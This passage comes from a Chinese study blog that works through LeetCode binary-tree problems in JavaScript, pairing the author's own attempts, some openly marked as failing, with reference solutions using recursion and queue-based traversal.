href="#思路2-amp-题解-29" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>迭代：</p><p>使用队列来比较两个树（根节点的左右子树）是否相互翻转。手动将对称的节点按顺序入队，然后比较前两个是否相等。</p><p>（使用栈也可，只需把 shift 改成 pop ）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isSymmetric = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">   <span class="comment">//迭代方法判断是否是对称二叉树</span></span><br><span class="line">   <span class="comment">//首先判断root是否为空</span></span><br><span class="line">   <span class="keyword">if</span>(root===<span class="literal">null</span>)&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">let</span> queue=[];</span><br><span class="line">   queue.push(root.left);</span><br><span class="line">   queue.push(root.right);</span><br><span class="line">   <span class="keyword">while</span>(queue.length)&#123;</span><br><span class="line">       <span class="keyword">let</span> leftNode=queue.shift();<span class="comment">//左节点</span></span><br><span class="line">       <span class="keyword">let</span> rightNode=queue.shift();<span class="comment">//右节点</span></span><br><span class="line">       <span class="keyword">if</span>(leftNode===<span class="literal">null</span>&amp;&amp;rightNode===<span class="literal">null</span>)&#123;</span><br><span class="line">           <span class="keyword">continue</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(leftNode===<span class="literal">null</span>||rightNode===<span class="literal">null</span>||leftNode.val!==rightNode.val)&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       queue.push(leftNode.left);<span class="comment">//左节点左孩子入队</span></span><br><span class="line">       queue.push(rightNode.right);<span class="comment">//右节点右孩子入队</span></span><br><span class="line">       queue.push(leftNode.right);<span class="comment">//左节点右孩子入队</span></span><br><span class="line">       queue.push(rightNode.left);<span class="comment">//右节点左孩子入队</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode222——完全二叉树的节点个数（☆☆）"><a href="#LeetCode222——完全二叉树的节点个数（☆☆）" class="headerlink" title="LeetCode222——完全二叉树的节点个数（☆☆）"></a>LeetCode222——完全二叉树的节点个数（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/count-complete-tree-nodes/">跳转地址</a></p><h3 id="自己的代码-47"><a href="#自己的代码-47" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>套用迭代版层序遍历模板，比较容易：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> countNodes = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> queue = [root], count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (queue.length) &#123;</span><br><span class="line">        <span class="keyword">let</span> length = queue.length;</span><br><span class="line">        <span class="keyword">while</span>(length--)&#123;</span><br><span class="line">            <span class="keyword">let</span> node = queue.shift();</span><br><span class="line">            count++;</span><br><span class="line">            node.left &amp;&amp; queue.push(node.left);</span><br><span class="line">            node.right &amp;&amp; queue.push(node.right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路-amp-题解-25"><a href="#思路-amp-题解-25" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>还可以递归（在内部写一个递归函数）：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> countNodes = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 确定递归函数参数</span></span><br><span class="line">    <span class="keyword">const</span> getNodeSum=<span class="function"><span class="keyword">function</span>(<span class="params">node</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 2. 确定终止条件</span></span><br><span class="line">        <span class="keyword">if</span>(node===<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// 3. 确定单层递归逻辑</span></span><br><span class="line">        <span class="keyword">let</span> leftNum=getNodeSum(node.left);</span><br><span class="line">        <span class="keyword">let</span> rightNum=getNodeSum(node.right);</span><br><span class="line">        <span class="keyword">return</span> leftNum+rightNum+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getNodeSum(root);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode257——二叉树的所有路径（☆）（★）"><a href="#LeetCode257——二叉树的所有路径（☆）（★）" class="headerlink" title="LeetCode257——二叉树的所有路径（☆）（★）"></a>LeetCode257——二叉树的所有路径（☆）（★）</h2><p><a href="https://leetcode-cn.com/problems/binary-tree-paths/">跳转地址</a></p><h3 id="自己的代码-48"><a href="#自己的代码-48" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>不会，不知道如何用递归表示。</p><h3 id="思路-amp-题解-26"><a href="#思路-amp-题解-26" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> binaryTreePaths = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = [];</span><br><span class="line">    <span class="comment">// 1.确定递归函数、参数</span></span><br><span class="line">    <span class="keyword">const</span> getPath = <span class="function"><span class="keyword">function</span> (<span class="params">node, curPath</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 2.确定终止条件, 到叶子结点终止</span></span><br><span class="line">        <span class="keyword">if</span> (node.left === <span class="literal">null</span> &amp;&amp; node.right === <span class="literal">null</span>) &#123;</span><br><span class="line">            curPath += node.val;</span><br><span class="line">            res.push(curPath);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3.单层递归 逻辑</span></span><br><span class="line">        curPath += node.val + <span class="string">&#x27;-&gt;&#x27;</span>;</span><br><span class="line">        node.left &amp;&amp; getPath(node.left, curPath);</span><br><span class="line">        node.right &amp;&amp; getPath(node.right, curPath);</span><br><span class="line">    &#125;</span><br><span class="line">    getPath(root, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><p>感觉这样的写法才是真正掌握了递归的用法，好像二叉树的题都能用递归来写。</p><h2 id="LeetCode112——路径总和（☆）"><a href="#LeetCode112——路径总和（☆）" class="headerlink" title="LeetCode112——路径总和（☆）"></a>LeetCode112——路径总和（☆）</h2><p><a href="https://leetcode-cn.com/problems/path-sum/">跳转地址</a></p><h3 id="自己的代码-49"><a href="#自己的代码-49" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hasPathSum = <span class="function"><span class="keyword">function</span>(<span class="params">root, targetSum</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">const</span> dfsTree = <span class="function"><span class="keyword">function</span> (<span class="params">node, curSum</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!node) <span class="keyword">return</span>;</span><br><span class="line">        curSum += node.val;</span><br><span class="line">        <span class="keyword">if</span> (curSum === targetSum) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        node.left &amp;&amp; dfsTree(node.left, curSum);</span><br><span class="line">        node.right &amp;&amp; dfsTree(node.right, curSum);</span><br><span class="line">    &#125;</span><br><span class="line">    res = dfsTree(root, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>未 AC，输出 undefined 。</p><h3 id="思路1-amp-题解-28"><a href="#思路1-amp-题解-28" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>递归，通过改变 targetSum 进行递归，不必自己弄一个值，然后不断累积：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hasPathSum = <span class="function"><span class="keyword">function</span>(<span class="params">root, targetSum</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (!root.left &amp;&amp; !root.right) &#123;</span><br><span class="line">        <span class="keyword">return</span> root.val === targetSum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hasPathSum(root.left, targetSum - root.val) || hasPathSum(root.right, targetSum - root.val);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>时间复杂度O(N)：其中 N 是树的节点数。对每个节点访问一次。</p><h3 id="思路2-amp-题解-30"><a href="#思路2-amp-题解-30" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hasPathSum = <span class="function"><span class="keyword">function</span>(<span class="params">root, sum</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> queue = [root];</span><br><span class="line">    <span class="keyword">while</span> (queue.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> cur = queue.shift();</span><br><span class="line">        <span class="keyword">if</span> (!cur.left &amp;&amp; !cur.right &amp;&amp; cur.val == sum) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cur.left) &#123;</span><br><span class="line">            cur.left.val += cur.val;</span><br><span class="line">            queue.push (cur.left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cur.right) &#123;</span><br><span class="line">            cur.right.val += cur.val;</span><br><span class="line">            queue.push (cur.right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode404——左叶子之和（☆）"><a href="#LeetCode404——左叶子之和（☆）" class="headerlink" title="LeetCode404——左叶子之和（☆）"></a>LeetCode404——左叶子之和（☆）</h2><p><a href="https://leetcode-cn.com/problems/sum-of-left-leaves/">跳转地址</a></p><h3 id="自己的代码-50"><a href="#自己的代码-50" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sumOfLeftLeaves = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> getLeft=<span class="function"><span class="keyword">function</span>(<span class="params">node</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!node) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (node.left === <span class="literal">null</span> &amp;&amp; node.right === <span class="literal">null</span> ) &#123;</span><br><span class="line">            count += node.val;</span><br><span class="line">        &#125;</span><br><span class="line">        node.left &amp;&amp; getLeft(node.left);</span><br><span class="line">        node.right &amp;&amp; node.right.left &amp;&amp; getLeft(node.right);</span><br><span class="line">    &#125;</span><br><span class="line">    getLeft(root);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>没有过，这里忽略了 root 为 [1] 的情况，但是想不到如何列出这种情况。</p><h3 id="思路-amp-题解-27"><a href="#思路-amp-题解-27" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>通过默认传参的方式标记递归的是左子树还是右子树，根节点默认false。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sumOfLeftLeaves = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> getLeft=<span class="function"><span class="keyword">function</span>(<span class="params">node, isLeft = <span class="literal">false</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!node) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">// 是左叶子结点再计算总和</span></span><br><span class="line">        <span class="keyword">if</span> (isLeft &amp;&amp; !node.left&amp;&amp; !node.right) &#123;</span><br><span class="line">            count += node.val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 左子树递归传入true，右子树传入false</span></span><br><span class="line">        node.left &amp;&amp; getLeft(node.left, <span class="literal">true</span>);</span><br><span class="line">        node.right &amp;&amp; getLeft(node.right);</span><br><span class="line">    &#125;</span><br><span class="line">    getLeft(root);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode513——找树左下角的值（☆☆）"><a href="#LeetCode513——找树左下角的值（☆☆）" class="headerlink" title="LeetCode513——找树左下角的值（☆☆）"></a>LeetCode513——找树左下角的值（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/find-bottom-left-tree-value/">跳转地址</a></p><h3 id="自己的代码-51"><a href="#自己的代码-51" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findBottomLeftValue = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = [], queue = [], result=[];</span><br><span class="line">    queue.push(root);</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> res;</span><br><span class="line">    <span class="keyword">while</span> (queue.length!= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> length = queue.length;</span><br><span class="line">        <span class="keyword">let</span> curList = [];</span><br><span class="line">        <span class="keyword">while</span> (length--) &#123;</span><br><span class="line">            <span class="keyword">let</span> curNode = queue.shift();</span><br><span class="line">            curList.push(curNode);</span><br><span class="line">            curNode.left &amp;&amp; queue.push(curNode.left);</span><br><span class="line">            curNode.right &amp;&amp; queue.push(curNode.right);</span><br><span class="line">        &#125;</span><br><span class="line">        res.push(curList);</span><br><span class="line">    &#125;</span><br><span class="line">    result = res[res.length - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> result[<span class="number">0</span>]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>没有过，想法很简单，就是层序遍历后 return res最后一层的首位，但是最后结果是NaN，应该是哪数据类型错了。（二叉树无法调试=）</p><h3 id="思路1-amp-题解-29"><a href="#思路1-amp-题解-29" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>还是迭代，只是不需要借助数组，利用 resNode ，一直覆盖，直到遍历最底层的 curNode.val ，最后 return 。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findBottomLeftValue = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> queue = [], resNode;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">    queue.push(root);</span><br><span class="line">    <span class="keyword">while</span> (queue.length) &#123;</span><br><span class="line">        <span class="keyword">let</span> length = queue.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">            <span class="keyword">let</span> curNode = queue.shift();</span><br><span class="line">            <span class="keyword">if</span> (i === <span class="number">0</span>) &#123;</span><br><span class="line">                resNode = curNode.val;</span><br><span class="line">            &#125;</span><br><span class="line">            curNode.left &amp;&amp; queue.push(curNode.left);</span><br><span class="line">            curNode.right &amp;&amp; queue.push(curNode.right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resNode</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-31"><a href="#思路2-amp-题解-31" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>递归比较深度，最深的第一个就是：(最底层最左，也可以是右子树的右子树)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findBottomLeftValue = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 递归，找前序遍历中最大深度的叶子结点</span></span><br><span class="line">    <span class="keyword">let</span> maxPath = <span class="number">0</span>, resNode = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">const</span> dfsTree = <span class="function"><span class="keyword">function</span> (<span class="params">node, curPath</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 2.确定终止条件</span></span><br><span class="line">        <span class="keyword">if</span> (!node.left &amp;&amp; !node.right) &#123;</span><br><span class="line">            <span class="keyword">if</span> (curPath &gt; maxPath) &#123;</span><br><span class="line">                maxPath = curPath;</span><br><span class="line">                resNode = node.val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3.单层递归逻辑</span></span><br><span class="line">        node.left &amp;&amp; dfsTree(node.left, curPath + <span class="number">1</span>);</span><br><span class="line">        node.right &amp;&amp; dfsTree(node.right, curPath + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    dfsTree(root, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> resNode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode226——翻转二叉树（☆）（★）"><a href="#LeetCode226——翻转二叉树（☆）（★）" class="headerlink" title="LeetCode226——翻转二叉树（☆）（★）"></a>LeetCode226——翻转二叉树（☆）（★）</h2><p><a href="https://leetcode-cn.com/problems/invert-binary-tree/">跳转地址</a></p><h3 id="自己的代码-52"><a href="#自己的代码-52" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>竟然没有思路，哎。想着是先左右中的顺序得到二叉树的节点，然后通过节点列表以右左中的顺序构造二叉树，但这样难度明显增大。</p><h3 id="思路1-amp-题解-30"><a href="#思路1-amp-题解-30" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><ul><li><p>首先递归函数会走到底，遇到 root == null， 发现叶子节点没有root.left、root.right，执行为空。</p></li><li><p>回退，在第二层的节点，发现有 root.left、root.right 了，开始翻转（<strong>左右节点</strong>）。</p></li></ul><ul><li>在第一次根节点，继续翻转（<strong>左右子树</strong>）。</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> invertTree = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">const</span> left = invertTree(root.left);</span><br><span class="line">    <span class="keyword">const</span> right = invertTree(root.right);</span><br><span class="line">    root.left = right;</span><br><span class="line">    root.right = left;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-32"><a href="#思路2-amp-题解-32" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">invertTree</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stack = [root];</span><br><span class="line">  <span class="keyword">while</span> (stack.length) &#123;</span><br><span class="line">    <span class="keyword">const</span> n = stack.pop();</span><br><span class="line">    <span class="keyword">if</span> (n != <span class="literal">null</span>) &#123;</span><br><span class="line">      [n.left, n.right] = [n.right, n.left];</span><br><span class="line">      stack.push(n.left, n.right);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode106——从中序与后序遍历序列构造二叉树（☆☆）（★）"><a href="#LeetCode106——从中序与后序遍历序列构造二叉树（☆☆）（★）" class="headerlink" title="LeetCode106——从中序与后序遍历序列构造二叉树（☆☆）（★）"></a>LeetCode106——从中序与后序遍历序列构造二叉树（☆☆）（★）</h2><p><a href="https://leetcode-cn.com/problems/construct-binary-tree-from-inorder-and-postorder-traversal/">跳转地址</a></p><h3 id="自己的代码-53"><a href="#自己的代码-53" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>大致思路理解，后序遍历的最后一个值即为根节点，然后在中序遍历中以根节点为界，左边就是左子树，右边就是右子树，再进行递归。可是不会用代码描述。</p><h3 id="思路-amp-题解-28"><a href="#思路-amp-题解-28" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> buildTree = <span class="function"><span class="keyword">function</span> (<span class="params">inorder, postorder</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!inorder.length) &#123;<span class="keyword">return</span> <span class="literal">null</span>&#125;;</span><br><span class="line">  <span class="keyword">let</span> root = <span class="keyword">new</span> TreeNode(postorder[postorder.length-<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">let</span> mid = inorder.indexOf(postorder.pop());</span><br><span class="line">  <span class="comment">//左右子树递归</span></span><br><span class="line">  root.left = buildTree(inorder.slice(<span class="number">0</span>, mid), postorder.slice(<span class="number">0</span>, mid));</span><br><span class="line">  root.right = buildTree(inorder.slice(mid + <span class="number">1</span>), postorder.slice(mid));</span><br><span class="line">  <span class="keyword">return</span> root;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>思路没错，但是这最后有点没看懂。。</p><h2 id="LeetCode105——从前序与中序遍历序列构造二叉树（☆☆）"><a href="#LeetCode105——从前序与中序遍历序列构造二叉树（☆☆）" class="headerlink" title="LeetCode105——从前序与中序遍历序列构造二叉树（☆☆）"></a>LeetCode105——从前序与中序遍历序列构造二叉树（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/construct-binary-tree-from-preorder-and-inorder-traversal/">跳转地址</a></p><h3 id="思路-amp-题解-29"><a href="#思路-amp-题解-29" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> buildTree = <span class="function"><span class="keyword">function</span>(<span class="params">preorder, inorder</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!preorder.length || !inorder.length) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="comment">// 根节点</span></span><br><span class="line">  <span class="keyword">let</span> node = <span class="keyword">new</span> TreeNode(preorder[<span class="number">0</span>]);</span><br><span class="line">  <span class="comment">//找到preoder[0]对应inorder中的位置</span></span><br><span class="line">  <span class="keyword">let</span> index = inorder.indexOf(preorder.shift());</span><br><span class="line">  <span class="comment">//左右子树递归</span></span><br><span class="line">  node.left = buildTree(preorder, inorder.slice(<span class="number">0</span>, index));</span><br><span class="line">  node.right = buildTree(preorder, inorder.slice(index + <span class="number">1</span>));</span><br><span class="line">  <span class="comment">//返回根节点</span></span><br><span class="line">  <span class="keyword">return</span> node;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode617——合并二叉树（☆）"><a href="#LeetCode617——合并二叉树（☆）" class="headerlink" title="LeetCode617——合并二叉树（☆）"></a>LeetCode617——合并二叉树（☆）</h2><p><a href="https://leetcode-cn.com/problems/merge-two-binary-trees/">跳转地址</a></p><h3 id="自己的代码-54"><a href="#自己的代码-54" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mergeTrees = <span class="function"><span class="keyword">function</span>(<span class="params">root1, root2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root1.left &amp;&amp; !root1.right &amp;&amp;!root2.left &amp;&amp;!root2.right) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (root1 &amp;&amp; root2) &#123;</span><br><span class="line">        root1.val += root2.val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>没写完，感觉对临界条件的判断还是很乱很乱。想的情况太多了。</p><h3 id="思路-amp-题解-30"><a href="#思路-amp-题解-30" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>递归：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mergeTrees = <span class="function"><span class="keyword">function</span> (<span class="params">root1, root2</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 终止条件：如果t1 == NULL ，两个树合并就是 t2；如果t2 == NULL，两个数合并就是t1。</span></span><br><span class="line">    <span class="keyword">if</span> (!root1) &#123;</span><br><span class="line">        <span class="keyword">return</span> root2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!root2) &#123;</span><br><span class="line">        <span class="keyword">return</span> root1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 单层递归逻辑（好像不用考虑root2.val是否存在？）</span></span><br><span class="line">    root1.val += root2.val;</span><br><span class="line">    root1.left = mergeTrees(root1.left, root2.left);</span><br><span class="line">    root1.right = mergeTrees(root1.right, root2.right);</span><br><span class="line">    <span class="keyword">return</span> root1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode98——验证二叉搜索树（☆☆）"><a href="#LeetCode98——验证二叉搜索树（☆☆）" class="headerlink" title="LeetCode98——验证二叉搜索树（☆☆）"></a>LeetCode98——验证二叉搜索树（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/validate-binary-search-tree/">跳转地址</a></p><h3 id="自己的代码-55"><a href="#自己的代码-55" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>完全没头绪。</p><p>看了一眼题解，原来可以用中序遍历的方法判断是不是升序就行：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isValidBST = <span class="function"><span class="keyword">function</span> (<span class="params">root</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> arr = [];</span><br><span class="line">  <span class="keyword">const</span> inOrder = <span class="function"><span class="keyword">function</span> (<span class="params">root, res=[]</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    inOrder(root.left, res);</span><br><span class="line">    res.push(root.val);</span><br><span class="line">    inOrder(root.right, res);</span><br><span class="line">  &#125;</span><br><span class="line">  inOrder(root, arr);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (arr[i] &gt;= arr[i + <span class="number">1</span>]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-33"><a href="#思路2-amp-题解-33" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>递归：(写得也太巧了)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isValidBST = <span class="function"><span class="keyword">function</span>(<span class="params">root, min = -<span class="literal">Infinity</span>, max = <span class="literal">Infinity</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (min &amp;&amp; root.val &lt;= min.val) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (max &amp;&amp; root.val &gt;= max.val) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> isValidBST(root.left, min, root) &amp;&amp; isValidBST(root.right, root, max);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode236——二叉树的最近公共祖先（☆☆）（to-redo）"><a href="#LeetCode236——二叉树的最近公共祖先（☆☆）（to-redo）" class="headerlink" title="LeetCode236——二叉树的最近公共祖先（☆☆）（to redo）"></a>LeetCode236——二叉树的最近公共祖先（☆☆）（to redo）</h2><p>跳转地址</p><h3 id="自己的代码-56"><a href="#自己的代码-56" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>不会。。</p><h3 id="思路-amp-题解-31"><a href="#思路-amp-题解-31" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>对于根节点 root，p、q 的分布，有两种可能：</p><ul><li>p、q 分居 root 的左右子树，则最近公共祖先（LCA） 为 root。</li><li>p、q 存在于 root 的同一侧子树中，就变成规模小一点的相同问题。</li></ul><p>从根节点 root 开始往下递归遍历：</p><ul><li><p>遍历到 p 或 q，比如 p，则 LCA 要么是当前的 p（q 在 p 的子树中），要么是 p 之上的节点（q 不在 p 的子树中），不可能是 p 之下的节点，因此返回当前的 p。</p></li><li><p>当遍历到 null 节点，没有 LCA，返回 null。</p></li><li><p>当遍历的节点 root 不是 p 或 q 或 